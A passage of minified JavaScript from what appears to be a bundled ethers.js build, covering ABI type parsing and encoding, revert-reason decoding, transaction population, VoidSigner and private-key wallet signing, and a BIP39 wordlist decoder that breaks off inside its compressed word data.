    popType(e) {
        if (this.peek().type !== e) {
            const t = this.peek();
            throw new Error(`expected ${e}; got ${t.type} ${JSON.stringify(t.text)}`)
        }
        return this.pop().text
    }
    popParen() {
        const e = this.peek();
        if (e.type !== "OPEN_PAREN")
            throw new Error("bad start");
        const t = Dt(this, o0, vA).call(this, Ae(this, Ln) + 1, e.match + 1);
        return He(this, Ln, e.match + 1),
        t
    }
    popParams() {
        const e = this.peek();
        if (e.type !== "OPEN_PAREN")
            throw new Error("bad start");
        const t = [];
        for (; Ae(this, Ln) < e.match - 1; ) {
            const o = this.peek().linkNext;
            t.push(Dt(this, o0, vA).call(this, Ae(this, Ln) + 1, o)),
            He(this, Ln, o)
        }
        return He(this, Ln, e.match + 1),
        t
    }
    peek() {
        if (Ae(this, Ln) >= Ae(this, ns).length)
            throw new Error("out-of-bounds");
        return Ae(this, ns)[Ae(this, Ln)]
    }
    peekKeyword(e) {
        const t = this.peekType("KEYWORD");
        return t != null && e.has(t) ? t : null
    }
    peekType(e) {
        if (this.length === 0)
            return null;
        const t = this.peek();
        return t.type === e ? t.text : null
    }
    pop() {
        const e = this.peek();
        return Cv(this, Ln)._++,
        e
    }
    toString() {
        const e = [];
        for (let t = Ae(this, Ln); t < Ae(this, ns).length; t++) {
            const o = Ae(this, ns)[t];
            e.push(`${o.type}:${o.text}`)
        }
        return `<TokenString ${e.join(" ")}>`
    }
}
,
Ln = new WeakMap,
ns = new WeakMap,
o0 = new WeakSet,
vA = function(e=0, t=0) {
    return new cu(Ae(this, ns).slice(e, t).map(o => Object.freeze(Object.assign({}, o, {
        match: o.match - e,
        linkBack: o.linkBack - e,
        linkNext: o.linkNext - e
    }))))
}
,
cu);
function bhe(r) {
    const e = []
      , t = s => {
        const a = n < r.length ? JSON.stringify(r[n]) : "$EOI";
        throw new Error(`invalid token ${a} at ${n}: ${s}`)
    }
    ;
    let o = []
      , i = []
      , n = 0;
    for (; n < r.length; ) {
        let s = r.substring(n)
          , a = s.match(hhe);
        a && (n += a[1].length,
        s = r.substring(n));
        const l = {
            depth: o.length,
            linkBack: -1,
            linkNext: -1,
            match: -1,
            type: "",
            text: "",
            offset: n,
            value: -1
        };
        e.push(l);
        let f = dhe[s[0]] || "";
        if (f) {
            if (l.type = f,
            l.text = s[0],
            n++,
            f === "OPEN_PAREN")
                o.push(e.length - 1),
                i.push(e.length - 1);
            else if (f == "CLOSE_PAREN")
                o.length === 0 && t("no matching open bracket"),
                l.match = o.pop(),
                e[l.match].match = e.length - 1,
                l.depth--,
                l.linkBack = i.pop(),
                e[l.linkBack].linkNext = e.length - 1;
            else if (f === "COMMA")
                l.linkBack = i.pop(),
                e[l.linkBack].linkNext = e.length - 1,
                i.push(e.length - 1);
            else if (f === "OPEN_BRACKET")
                l.type = "BRACKET";
            else if (f === "CLOSE_BRACKET") {
                let h = e.pop().text;
                if (e.length > 0 && e[e.length - 1].type === "NUMBER") {
                    const p = e.pop().text;
                    h = p + h,
                    e[e.length - 1].value = jn(p)
                }
                if (e.length === 0 || e[e.length - 1].type !== "BRACKET")
                    throw new Error("missing opening bracket");
                e[e.length - 1].text += h
            }
            continue
        }
        if (a = s.match(ghe),
        a) {
            if (l.text = a[1],
            n += l.text.length,
            fhe.has(l.text)) {
                l.type = "KEYWORD";
                continue
            }
            if (l.text.match(yF)) {
                l.type = "TYPE";
                continue
            }
            l.type = "ID";
            continue
        }
        if (a = s.match(phe),
        a) {
            l.text = a[1],
            l.type = "NUMBER",
            n += l.text.length;
            continue
        }
        throw new Error(`unexpected token ${JSON.stringify(s[0])} at position ${n}`)
    }
    return new bF(e.map(s => Object.freeze(s)))
}
function FR(r, e) {
    const t = new Set;
    for (; ; ) {
        const o = r.peekType("KEYWORD");
        if (o == null || e && !e.has(o))
            break;
        if (r.pop(),
        t.has(o))
            throw new Error(`duplicate keywords: ${JSON.stringify(o)}`);
        t.add(o)
    }
    return Object.freeze(t)
}
const mhe = new RegExp(/^(.*)\[([0-9]*)\]$/);
function UR(r) {
    const e = r.match(yF);
    if (pe(e, "invalid type", "type", r),
    r === "uint")
        return "uint256";
    if (r === "int")
        return "int256";
    if (e[2]) {
        const t = parseInt(e[2]);
        pe(t !== 0 && t <= 32, "invalid bytes length", "type", r)
    } else if (e[3]) {
        const t = parseInt(e[3]);
        pe(t !== 0 && t <= 256 && t % 8 === 0, "invalid numeric width", "type", r)
    }
    return r
}
const Nf = {}
  , kR = Symbol.for("_ethers_internal")
  , LR = "_ParamTypeInternal";
var yd, Om, uo;
let $2 = (uo = class {
    constructor(e, t, o, i, n, s, a, l) {
        ft(this, yd);
        we(this, "name");
        we(this, "type");
        we(this, "baseType");
        we(this, "indexed");
        we(this, "components");
        we(this, "arrayLength");
        we(this, "arrayChildren");
        if (el(e, Nf, "ParamType"),
        Object.defineProperty(this, kR, {
            value: LR
        }),
        s && (s = Object.freeze(s.slice())),
        i === "array") {
            if (a == null || l == null)
                throw new Error("")
        } else if (a != null || l != null)
            throw new Error("");
        if (i === "tuple") {
            if (s == null)
                throw new Error("")
        } else if (s != null)
            throw new Error("");
        tr(this, {
            name: t,
            type: o,
            baseType: i,
            indexed: n,
            components: s,
            arrayLength: a,
            arrayChildren: l
        })
    }
    format(e) {
        if (e == null && (e = "sighash"),
        e === "json") {
            const o = this.name || "";
            if (this.isArray()) {
                const n = JSON.parse(this.arrayChildren.format("json"));
                return n.name = o,
                n.type += `[${this.arrayLength < 0 ? "" : String(this.arrayLength)}]`,
                JSON.stringify(n)
            }
            const i = {
                type: this.baseType === "tuple" ? "tuple" : this.type,
                name: o
            };
            return typeof this.indexed == "boolean" && (i.indexed = this.indexed),
            this.isTuple() && (i.components = this.components.map(n => JSON.parse(n.format(e)))),
            JSON.stringify(i)
        }
        let t = "";
        return this.isArray() ? (t += this.arrayChildren.format(e),
        t += `[${this.arrayLength < 0 ? "" : String(this.arrayLength)}]`) : this.isTuple() ? t += "(" + this.components.map(o => o.format(e)).join(e === "full" ? ", " : ",") + ")" : t += this.type,
        e !== "sighash" && (this.indexed === !0 && (t += " indexed"),
        e === "full" && this.name && (t += " " + this.name)),
        t
    }
    isArray() {
        return this.baseType === "array"
    }
    isTuple() {
        return this.baseType === "tuple"
    }
    isIndexable() {
        return this.indexed != null
    }
    walk(e, t) {
        if (this.isArray()) {
            if (!Array.isArray(e))
                throw new Error("invalid array value");
            if (this.arrayLength !== -1 && e.length !== this.arrayLength)
                throw new Error("array is wrong length");
            const o = this;
            return e.map(i => o.arrayChildren.walk(i, t))
        }
        if (this.isTuple()) {
            if (!Array.isArray(e))
                throw new Error("invalid tuple value");
            if (e.length !== this.components.length)
                throw new Error("array is wrong length");
            const o = this;
            return e.map( (i, n) => o.components[n].walk(i, t))
        }
        return t(this.type, e)
    }
    async walkAsync(e, t) {
        const o = []
          , i = [e];
        return Dt(this, yd, Om).call(this, o, e, t, n => {
            i[0] = n
        }
        ),
        o.length && await Promise.all(o),
        i[0]
    }
    static from(e, t) {
        if (uo.isParamType(e))
            return e;
        if (typeof e == "string")
            try {
                return uo.from(bhe(e), t)
            } catch {
                pe(!1, "invalid param type", "obj", e)
            }
        else if (e instanceof bF) {
            let a = ""
              , l = ""
              , f = null;
            FR(e, rh(["tuple"])).has("tuple") || e.peekType("OPEN_PAREN") ? (l = "tuple",
            f = e.popParams().map(x => uo.from(x)),
            a = `tuple(${f.map(x => x.format()).join(",")})`) : (a = UR(e.popType("TYPE")),
            l = a);
            let h = null
              , p = null;
            for (; e.length && e.peekType("BRACKET"); ) {
                const x = e.pop();
                h = new uo(Nf,"",a,l,null,f,p,h),
                p = x.value,
                a += x.text,
                l = "array",
                f = null
            }
            let b = null;
            if (FR(e, che).has("indexed")) {
                if (!t)
                    throw new Error("");
                b = !0
            }
            const T = e.peekType("ID") ? e.pop().text : "";
            if (e.length)
                throw new Error("leftover tokens");
            return new uo(Nf,T,a,l,b,f,p,h)
        }
        const o = e.name;
        pe(!o || typeof o == "string" && o.match(yhe), "invalid name", "obj.name", o);
        let i = e.indexed;
        i != null && (pe(t, "parameter cannot be indexed", "obj.indexed", e.indexed),
        i = !!i);
        let n = e.type
          , s = n.match(mhe);
        if (s) {
            const a = parseInt(s[2] || "-1")
              , l = uo.from({
                type: s[1],
                components: e.components
            });
            return new uo(Nf,o || "",n,"array",i,null,a,l)
        }
        if (n === "tuple" || n.startsWith("tuple(") || n.startsWith("(")) {
            const a = e.components != null ? e.components.map(f => uo.from(f)) : null;
            return new uo(Nf,o || "",n,"tuple",i,a,null,null)
        }
        return n = UR(e.type),
        new uo(Nf,o || "",n,n,i,null,null,null)
    }
    static isParamType(e) {
        return e && e[kR] === LR
    }
}
,
yd = new WeakSet,
Om = function(e, t, o, i) {
    if (this.isArray()) {
        if (!Array.isArray(t))
            throw new Error("invalid array value");
        if (this.arrayLength !== -1 && t.length !== this.arrayLength)
            throw new Error("array is wrong length");
        const s = this.arrayChildren
          , a = t.slice();
        a.forEach( (l, f) => {
            var h;
            Dt(h = s, yd, Om).call(h, e, l, o, p => {
                a[f] = p
            }
            )
        }
        ),
        i(a);
        return
    }
    if (this.isTuple()) {
        const s = this.components;
        let a;
        if (Array.isArray(t))
            a = t.slice();
        else {
            if (t == null || typeof t != "object")
                throw new Error("invalid tuple value");
            a = s.map(l => {
                if (!l.name)
                    throw new Error("cannot use object value with unnamed components");
                if (!(l.name in t))
                    throw new Error(`missing value for component ${l.name}`);
                return t[l.name]
            }
            )
        }
        if (a.length !== this.components.length)
            throw new Error("array is wrong length");
        a.forEach( (l, f) => {
            var h;
            Dt(h = s[f], yd, Om).call(h, e, l, o, p => {
                a[f] = p
            }
            )
        }
        ),
        i(a);
        return
    }
    const n = o(this.type, t);
    n.then ? e.push(async function() {
        i(await n)
    }()) : i(n)
}
,
uo);
const ds = new Map;
ds.set(0, "GENERIC_PANIC");
ds.set(1, "ASSERT_FALSE");
ds.set(17, "OVERFLOW");
ds.set(18, "DIVIDE_BY_ZERO");
ds.set(33, "ENUM_RANGE_ERROR");
ds.set(34, "BAD_STORAGE_DATA");
ds.set(49, "STACK_UNDERFLOW");
ds.set(50, "ARRAY_RANGE_ERROR");
ds.set(65, "OUT_OF_MEMORY");
ds.set(81, "UNINITIALIZED_FUNCTION_CALL");
const xhe = new RegExp(/^bytes([0-9]*)$/)
  , whe = new RegExp(/^(u?int)([0-9]*)$/);
let z2 = null
  , $R = 1024;
function vhe(r, e, t, o) {
    let i = "missing revert data"
      , n = null;
    const s = null;
    let a = null;
    if (t) {
        i = "execution reverted";
        const f = pt(t);
        if (t = et(t),
        f.length === 0)
            i += " (no data present; likely require(false) occurred",
            n = "require(false)";
        else if (f.length % 32 !== 4)
            i += " (could not decode reason; invalid data length)";
        else if (et(f.slice(0, 4)) === "0x08c379a0")
            try {
                n = o.decode(["string"], f.slice(4))[0],
                a = {
                    signature: "Error(string)",
                    name: "Error",
                    args: [n]
                },
                i += `: ${JSON.stringify(n)}`
            } catch {
                i += " (could not decode reason; invalid string data)"
            }
        else if (et(f.slice(0, 4)) === "0x4e487b71")
            try {
                const h = Number(o.decode(["uint256"], f.slice(4))[0]);
                a = {
                    signature: "Panic(uint256)",
                    name: "Panic",
                    args: [h]
                },
                n = `Panic due to ${ds.get(h) || "UNKNOWN"}(${h})`,
                i += `: ${n}`
            } catch {
                i += " (could not decode panic code)"
            }
        else
            i += " (unknown custom error)"
    }
    const l = {
        to: e.to ? fi(e.to) : null,
        data: e.data || "0x"
    };
    return e.from && (l.from = fi(e.from)),
    XD(i, "CALL_EXCEPTION", {
        action: r,
        data: t,
        reason: n,
        transaction: l,
        invocation: s,
        revert: a
    })
}
var Lc, $f;
const x1 = class x1 {
    constructor() {
        ft(this, Lc)
    }
    getDefaultValue(e) {
        const t = e.map(i => Dt(this, Lc, $f).call(this, $2.from(i)));
        return new lm(t,"_").defaultValue()
    }
    encode(e, t) {
        JD(t.length, e.length, "types/values length mismatch");
        const o = e.map(s => Dt(this, Lc, $f).call(this, $2.from(s)))
          , i = new lm(o,"_")
          , n = new hA;
        return i.encode(n, t),
        n.data
    }
    decode(e, t, o) {
        const i = e.map(s => Dt(this, Lc, $f).call(this, $2.from(s)));
        return new lm(i,"_").decode(new pA(t,o,$R))
    }
    static _setDefaultMaxInflation(e) {
        pe(typeof e == "number" && Number.isInteger(e), "invalid defaultMaxInflation factor", "value", e),
        $R = e
    }
    static defaultAbiCoder() {
        return z2 == null && (z2 = new x1),
        z2
    }
    static getBuiltinCallException(e, t, o) {
        return vhe(e, t, o, x1.defaultAbiCoder())
    }
}
;
Lc = new WeakSet,
$f = function(e) {
    if (e.isArray())
        return new _de(Dt(this, Lc, $f).call(this, e.arrayChildren),e.arrayLength,e.name);
    if (e.isTuple())
        return new lm(e.components.map(o => Dt(this, Lc, $f).call(this, o)),e.name);
    switch (e.baseType) {
    case "address":
        return new Sde(e.name);
    case "bool":
        return new Ide(e.name);
    case "string":
        return new kde(e.name);
    case "bytes":
        return new Ode(e.name);
    case "":
        return new Mde(e.name)
    }
    let t = e.type.match(whe);
    if (t) {
        let o = parseInt(t[2] || "256");
        return pe(o !== 0 && o <= 256 && o % 8 === 0, "invalid " + t[1] + " bit length", "param", e),
        new Ude(o / 8,t[1] === "int",e.name)
    }
    if (t = e.type.match(xhe),
    t) {
        let o = parseInt(t[1]);
        return pe(o !== 0 && o <= 32, "invalid bytes length", "param", e),
        new Rde(o,e.name)
    }
    pe(!1, "invalid type", "type", e.type)
}
;
let Hc = x1;
BigInt(0);
function mF(r) {
    const e = {};
    r.to && (e.to = r.to),
    r.from && (e.from = r.from),
    r.data && (e.data = et(r.data));
    const t = "chainId,gasLimit,gasPrice,maxFeePerBlobGas,maxFeePerGas,maxPriorityFeePerGas,value".split(/,/);
    for (const i of t)
        !(i in r) || r[i] == null || (e[i] = Er(r[i], `request.${i}`));
    const o = "type,nonce".split(/,/);
    for (const i of o)
        !(i in r) || r[i] == null || (e[i] = jn(r[i], `request.${i}`));
    return r.accessList && (e.accessList = J1(r.accessList)),
    "blockTag"in r && (e.blockTag = r.blockTag),
    "enableCcipRead"in r && (e.enableCcipRead = !!r.enableCcipRead),
    "customData"in r && (e.customData = r.customData),
    "blobVersionedHashes"in r && r.blobVersionedHashes && (e.blobVersionedHashes = r.blobVersionedHashes.slice()),
    "kzg"in r && (e.kzg = r.kzg),
    "blobs"in r && r.blobs && (e.blobs = r.blobs.map(i => j1(i) ? et(i) : Object.assign({}, i))),
    e
}
function Df(r, e) {
    if (r.provider)
        return r.provider;
    Mt(!1, "missing provider", "UNSUPPORTED_OPERATION", {
        operation: e
    })
}
async function zR(r, e) {
    let t = mF(e);
    if (t.to != null && (t.to = l1(t.to, r)),
    t.from != null) {
        const o = t.from;
        t.from = Promise.all([r.getAddress(), l1(o, r)]).then( ([i,n]) => (pe(i.toLowerCase() === n.toLowerCase(), "transaction from mismatch", "tx.from", n),
        i))
    } else
        t.from = r.getAddress();
    return await K3(t)
}
class xF {
    constructor(e) {
        we(this, "provider");
        tr(this, {
            provider: e || null
        })
    }
    async getNonce(e) {
        return Df(this, "getTransactionCount").getTransactionCount(await this.getAddress(), e)
    }
    async populateCall(e) {
        return await zR(this, e)
    }
    async populateTransaction(e) {
        const t = Df(this, "populateTransaction")
          , o = await zR(this, e);
        o.nonce == null && (o.nonce = await this.getNonce("pending")),
        o.gasLimit == null && (o.gasLimit = await this.estimateGas(o));
        const i = await this.provider.getNetwork();
        if (o.chainId != null) {
            const s = Er(o.chainId);
            pe(s === i.chainId, "transaction chainId mismatch", "tx.chainId", e.chainId)
        } else
            o.chainId = i.chainId;
        const n = o.maxFeePerGas != null || o.maxPriorityFeePerGas != null;
        if (o.gasPrice != null && (o.type === 2 || n) ? pe(!1, "eip-1559 transaction do not support gasPrice", "tx", e) : (o.type === 0 || o.type === 1) && n && pe(!1, "pre-eip-1559 transaction do not support maxFeePerGas/maxPriorityFeePerGas", "tx", e),
        (o.type === 2 || o.type == null) && o.maxFeePerGas != null && o.maxPriorityFeePerGas != null)
            o.type = 2;
        else if (o.type === 0 || o.type === 1) {
            const s = await t.getFeeData();
            Mt(s.gasPrice != null, "network does not support gasPrice", "UNSUPPORTED_OPERATION", {
                operation: "getGasPrice"
            }),
            o.gasPrice == null && (o.gasPrice = s.gasPrice)
        } else {
            const s = await t.getFeeData();
            if (o.type == null)
                if (s.maxFeePerGas != null && s.maxPriorityFeePerGas != null)
                    if (o.type = 2,
                    o.gasPrice != null) {
                        const a = o.gasPrice;
                        delete o.gasPrice,
                        o.maxFeePerGas = a,
                        o.maxPriorityFeePerGas = a
                    } else
                        o.maxFeePerGas == null && (o.maxFeePerGas = s.maxFeePerGas),
                        o.maxPriorityFeePerGas == null && (o.maxPriorityFeePerGas = s.maxPriorityFeePerGas);
                else
                    s.gasPrice != null ? (Mt(!n, "network does not support EIP-1559", "UNSUPPORTED_OPERATION", {
                        operation: "populateTransaction"
                    }),
                    o.gasPrice == null && (o.gasPrice = s.gasPrice),
                    o.type = 0) : Mt(!1, "failed to get consistent fee data", "UNSUPPORTED_OPERATION", {
                        operation: "signer.getFeeData"
                    });
            else
                (o.type === 2 || o.type === 3) && (o.maxFeePerGas == null && (o.maxFeePerGas = s.maxFeePerGas),
                o.maxPriorityFeePerGas == null && (o.maxPriorityFeePerGas = s.maxPriorityFeePerGas))
        }
        return await K3(o)
    }
    async estimateGas(e) {
        return Df(this, "estimateGas").estimateGas(await this.populateCall(e))
    }
    async call(e) {
        return Df(this, "call").call(await this.populateCall(e))
    }
    async resolveName(e) {
        return await Df(this, "resolveName").resolveName(e)
    }
    async sendTransaction(e) {
        const t = Df(this, "sendTransaction")
          , o = await this.populateTransaction(e);
        delete o.from;
        const i = cF.from(o);
        return await t.broadcastTransaction(await this.signTransaction(i))
    }
}
var bd, Rm;
const N4 = class N4 extends xF {
    constructor(t, o) {
        super(o);
        ft(this, bd);
        we(this, "address");
        tr(this, {
            address: t
        })
    }
    async getAddress() {
        return this.address
    }
    connect(t) {
        return new N4(this.address,t)
    }
    async signTransaction(t) {
        Dt(this, bd, Rm).call(this, "transactions", "signTransaction")
    }
    async signMessage(t) {
        Dt(this, bd, Rm).call(this, "messages", "signMessage")
    }
    async signTypedData(t, o, i) {
        Dt(this, bd, Rm).call(this, "typed-data", "signTypedData")
    }
}
;
bd = new WeakSet,
Rm = function(t, o) {
    Mt(!1, `VoidSigner cannot sign ${t}`, "UNSUPPORTED_OPERATION", {
        operation: o
    })
}
;
let TA = N4;
var md;
const D4 = class D4 extends xF {
    constructor(t, o) {
        super(o);
        we(this, "address");
        ft(this, md);
        pe(t && typeof t.sign == "function", "invalid private key", "privateKey", "[ REDACTED ]"),
        He(this, md, t);
        const i = Q1(this.signingKey.publicKey);
        tr(this, {
            address: i
        })
    }
    get signingKey() {
        return Ae(this, md)
    }
    get privateKey() {
        return this.signingKey.privateKey
    }
    async getAddress() {
        return this.address
    }
    connect(t) {
        return new D4(Ae(this, md),t)
    }
    async signTransaction(t) {
        t = mF(t);
        const {to: o, from: i} = await K3({
            to: t.to ? l1(t.to, this.provider) : void 0,
            from: t.from ? l1(t.from, this.provider) : void 0
        });
        o != null && (t.to = o),
        i != null && (t.from = i),
        t.from != null && (pe(fi(t.from) === this.address, "transaction from address mismatch", "tx.from", t.from),
        delete t.from);
        const n = cF.from(t);
        return n.signature = this.signingKey.sign(n.unsignedHash),
        n.serialized
    }
    async signMessage(t) {
        return this.signMessageSync(t)
    }
    signMessageSync(t) {
        return this.signingKey.sign(ehe(t)).serialized
    }
    async signTypedData(t, o, i) {
        const n = await DR.resolveNames(t, o, i, async s => {
            Mt(this.provider != null, "cannot resolve ENS names without a provider", "UNSUPPORTED_OPERATION", {
                operation: "resolveName",
                info: {
                    name: s
                }
            });
            const a = await this.provider.resolveName(s);
            return Mt(a != null, "unconfigured ENS name", "UNCONFIGURED_NAME", {
                value: s
            }),
            a
        }
        );
        return this.signingKey.sign(DR.hash(n.domain, o, n.value)).serialized
    }
}
;
md = new WeakMap;
let EA = D4;
const u1 = " !#$%&'()*+,-./<=>?@[]^_`{|}~"
  , The = /^[a-z]*$/i;
function jR(r, e) {
    let t = 97;
    return r.reduce( (o, i) => (i === e ? t++ : i.match(The) ? o.push(String.fromCharCode(t) + i) : (t = 97,
    o.push(i)),
    o), [])
}
function Ehe(r, e) {
    for (let i = u1.length - 1; i >= 0; i--)
        r = r.split(u1[i]).join(e.substring(2 * i, 2 * i + 2));
    const t = []
      , o = r.replace(/(:|([0-9])|([A-Z][a-z]*))/g, (i, n, s, a) => {
        if (s)
            for (let l = parseInt(s); l >= 0; l--)
                t.push(";");
        else
            t.push(n.toLowerCase());
        return ""
    }
    );
    if (o)
        throw new Error(`leftovers: ${JSON.stringify(o)}`);
    return jR(jR(t, ";"), ":")
}
function Ahe(r) {
    return pe(r[0] === "0", "unsupported auwl data", "data", r),
    Ehe(r.substring(1 + 2 * u1.length), r.substring(1, 1 + 2 * u1.length))
}
class wF {
    constructor(e) {
        we(this, "locale");
        tr(this, {
            locale: e
        })
    }
    split(e) {
        return e.toLowerCase().split(/\s+/g)
    }
    join(e) {
        return e.join(" ")
    }
}
var xd, i0, Ql, s0, AA;
class Phe extends wF {
    constructor(t, o, i) {
        super(t);
        ft(this, s0);
        ft(this, xd);
        ft(this, i0);
        ft(this, Ql);
        He(this, xd, o),
        He(this, i0, i),
        He(this, Ql, null)
    }
    get _data() {
        return Ae(this, xd)
    }
    _decodeWords() {
        return Ahe(Ae(this, xd))
    }
    getWord(t) {
        const o = Dt(this, s0, AA).call(this);
        return pe(t >= 0 && t < o.length, `invalid word index: ${t}`, "index", t),
        o[t]
    }
    getWordIndex(t) {
        return Dt(this, s0, AA).call(this).indexOf(t)
    }
}
xd = new WeakMap,
i0 = new WeakMap,
Ql = new WeakMap,
s0 = new WeakSet,
AA = function() {
    if (Ae(this, Ql) == null) {
        const t = this._decodeWords();
        if (ls(t.join(`
`) + `
`) !== Ae(this, i0))
            throw new Error(`BIP39 Wordlist for ${this.locale} FAILED`);
        He(this, Ql, t)
    }
    return Ae(this, Ql)
}
;
const Che = "0erleonalorenseinceregesticitStanvetearctssi#ch2Athck&tneLl0And#Il.yLeOutO=S|S%b/ra@SurdU'0Ce[Cid|CountCu'Hie=IdOu,-Qui*Ro[TT]T%T*[Tu$0AptDD-tD*[Ju,M.UltV<)Vi)0Rob-0FairF%dRaid0A(EEntRee0Ead0MRRp%tS!_rmBumCoholErtI&LLeyLowMo,O}PhaReadySoT Ways0A>urAz(gOngOuntU'd0Aly,Ch%Ci|G G!GryIm$K!Noun)Nu$O` Sw T&naTiqueXietyY1ArtOlogyPe?P!Pro=Ril1ChCt-EaEnaGueMMedM%MyOundR<+Re,Ri=RowTTefa@Ti,Tw%k0KPe@SaultSetSi,SumeThma0H!>OmTa{T&dT.udeTra@0Ct]D.Gu,NtTh%ToTumn0Era+OcadoOid0AkeA*AyEsomeFulKw?d0Is:ByChel%C#D+GL<)Lc#y~MbooN<aNn RRelyRga(R*lSeS-SketTt!3A^AnAutyCau'ComeEfF%eG(Ha=H(dLie=LowLtN^Nef./TrayTt Twe&Y#d3Cyc!DKeNdOlogyRdR`Tt _{AdeAmeAnketA,EakE[IndOodO[omOu'UeUrUsh_rdAtDyIlMbNeNusOkO,Rd R(gRrowSsTtomUn)XY_{etA(AndA[A=EadEezeI{Id+IefIghtIngIskOccoliOk&OnzeOomO` OwnUsh2Bb!DdyD+tFf$oIldLbLkL!tNd!Nk Rd&Rg R,SS(e[SyTt Y Zz:Bba+B(B!CtusGeKe~LmM aMpNN$N)lNdyNn#NoeNvasNy#Pab!P.$Pta(RRb#RdRgoRpetRryRtSeShS(o/!Su$TT$ogT^Teg%yTt!UghtU'Ut]Ve3Il(gL yM|NsusNturyRe$Rta(_irAlkAmp]An+AosApt Ar+A'AtEapE{Ee'EfErryE,I{&IefIldIm}yOi)Oo'R#-U{!UnkUrn0G?Nnam#Rc!Tiz&TyVil_imApArifyAwAyE<ErkEv I{I|IffImbIn-IpO{OgO'O`OudOwnUbUmpU, Ut^_^A,C#utDeFfeeIlInL!@L%LumnMb(eMeMf%tM-Mm#Mp<yNc tNdu@NfirmNg*[N}@Nsid NtrolNv()OkOlPp PyR$ReRnR*@/Tt#U^UntryUp!Ur'Us(V Yo>_{Ad!AftAmA}AshAt AwlAzyEamEd.EekEwI{etImeIspIt-OpO[Ou^OwdUci$UelUi'Umb!Un^UshYY,$2BeLtu*PPbo?dRiousRr|Rta(R=Sh]/omTe3C!:DMa+MpN)Ng R(gShUght WnY3AlBa>BrisCadeCemb CideCl(eC%a>C*a'ErF&'F(eFyG*eLayLiv M<dMi'Ni$Nti,NyP?tP&dPos.P`PutyRi=ScribeS tSignSkSpair/royTailTe@VelopVi)Vo>3AgramAlAm#dAryCeE'lEtFf G.$Gn.yLemmaNn NosaurRe@RtSag*eScov Sea'ShSmi[S%d Splay/<)V tVideV%)Zzy5Ct%Cum|G~Lph(Ma(Na>NkeyN%OrSeUb!Ve_ftAg#AmaA,-AwEamE[IftIllInkIpI=OpUmY2CkMbNeR(g/T^Ty1Arf1Nam-:G G!RlyRnR`Sily/Sy1HoOlogyOnomy0GeItUca>1F%t0G1GhtTh 2BowD E@r-Eg<tEm|Eph<tEvat%I>Se0B?kBodyBra)Er+Ot]PloyPow Pty0Ab!A@DD![D%'EmyErgyF%)Ga+G(eH<)JoyLi,OughR-hRollSu*T Ti*TryVelope1Isode0U$Uip0AA'OdeOs]R%Upt0CapeSayS&)Ta>0Ern$H-s1Id&)IlOkeOl=1A@Amp!Ce[Ch<+C.eCludeCu'Ecu>Erci'Hau,Hib.I!I,ItOt-P<dPe@Pi*Pla(Po'P*[T&dTra0EEbrow:Br-CeCultyDeIntI`~L'MeMilyMousNNcyNtasyRmSh]TT$Th TigueUltV%.e3Atu*Bru?yD $EEdElMa!N)/iv$T^V W3B Ct]EldGu*LeLmLt N$NdNeNg NishReRmR,Sc$ShTT}[X_gAmeAshAtAv%EeIghtIpOatO{O%Ow UidUshY_mCusGIlLd~owOdOtR)Re,R+tRkRtu}RumRw?dSsil/ UndX_gi!AmeEqu|EshI&dIn+OgOntO,OwnOz&U.2ElNNnyRna)RyTu*:D+tInLaxy~ yMePRa+Rba+Rd&Rl-Rm|SSpTeTh U+Ze3N $NiusN*Nt!Nu(e/u*2O,0AntFtGg!Ng RaffeRlVe_dAn)A*A[IdeImp'ObeOomOryO=OwUe_tDde[LdOdO'RillaSpelSsipV nWn_bA)A(AntApeA[Av.yEatE&IdIefItOc yOupOwUnt_rdE[IdeIltIt?N3M:B.IrLfMm M, NdPpyRb%RdRshR=,TVeWkZ?d3AdAl`ArtAvyD+hogIght~oLmetLpNRo3Dd&Gh~NtPRe/%y5BbyCkeyLdLeLiday~owMeNeyOdPeRnRr%R'Sp.$/TelUrV 5BGeM<Mb!M%Nd*dNgryNtRd!RryRtSb<d3Brid:1EOn0EaEntifyLe2N%e4LLeg$L}[0A+Ita>M&'Mu}Pa@Po'Pro=Pul'0ChCludeComeC*a'DexD-a>Do%Du,ryF<tFl-tF%mHa!H .Iti$Je@JuryMa>N Noc|PutQuiryS<eSe@SideSpi*/$lTa@T e,ToVe,V.eVol=3On0L<dOla>Sue0Em1Ory:CketGu?RZz3AlousAns~yWel9BInKeUr}yY5D+I)MpNg!Ni%Nk/:Ng?oo3EnEpT^upY3CkDD}yNdNgdomSsTT^&TeTt&Wi4EeIfeO{Ow:BBelB%Dd DyKeMpNgua+PtopR+T T(UghUndryVaWWnWsu.Y Zy3Ad AfArnA=Ctu*FtGG$G&dIsu*M#NdNg`NsOp?dSs#Tt Vel3ArB tyBr?yC&'FeFtGhtKeMbM.NkOnQuid/Tt!VeZ?d5AdAnB, C$CkG-NelyNgOpTt yUdUn+VeY$5CkyGga+Mb N?N^Xury3R-s:Ch(eDG-G}tIdIlInJ%KeMm$NNa+Nda>NgoNs]Nu$P!Rb!R^Rg(R(eRketRria+SkSs/ T^T i$ThTrixTt XimumZe3AdowAnAsu*AtCh<-D$DiaLodyLtMb M%yNt]NuRcyR+R.RryShSsa+T$Thod3Dd!DnightLk~]M-NdNimumN%Nu>Rac!Rr%S ySs/akeXXedXtu*5Bi!DelDifyMM|N.%NkeyN, N`OnR$ReRn(gSqu.oTh T]T%Unta(U'VeVie5ChFf(LeLtiplySc!SeumShroomS-/Tu$3Self/ yTh:I=MePk(Rrow/yT]Tu*3ArCkEdGati=G!@I` PhewR=/TTw%kUtr$V WsXt3CeGht5B!I'M(eeOd!Rm$R`SeTab!TeTh(gTi)VelW5C!?Mb R'T:K0EyJe@Li+Scu*S =Ta(Vious0CurE<Tob 0Or1FF Fi)T&2L1Ay0DI=Ymp-0It0CeEI#L(eLy1EnEraIn]Po'T]1An+B.Ch?dD D(?yG<I|Ig($Ph<0Tr-h0H 0Tdo%T TputTside0AlEnEr0NN 0Yg&0/ 0O}:CtDd!GeIrLa)LmNdaNelN-N` P RadeR|RkRrotRtySsT^ThTi|TrolTt nU'VeYm|3A)AnutArAs<tL-<NN$tyNcilOp!Pp Rfe@Rm.Rs#T2O}OtoRa'Ys-$0AnoCn-Ctu*E)GGe#~LotNkO} Pe/olT^Zza_)A}tA,-A>AyEa'Ed+U{UgUn+2EmEtIntL?LeLi)NdNyOlPul?Rt]S.]Ssib!/TatoTt yV tyWd W _@i)Ai'Ed-tEf Epa*Es|EttyEv|I)IdeIm?yIntI%.yIs#Iva>IzeOb!mO)[Odu)Of.OgramOje@Omo>OofOp tyOsp O>@OudOvide2Bl-Dd(g~LpL'Mpk(N^PilPpyR^a'R.yRpo'R'ShTZz!3Ramid:99Al.yAntumArt 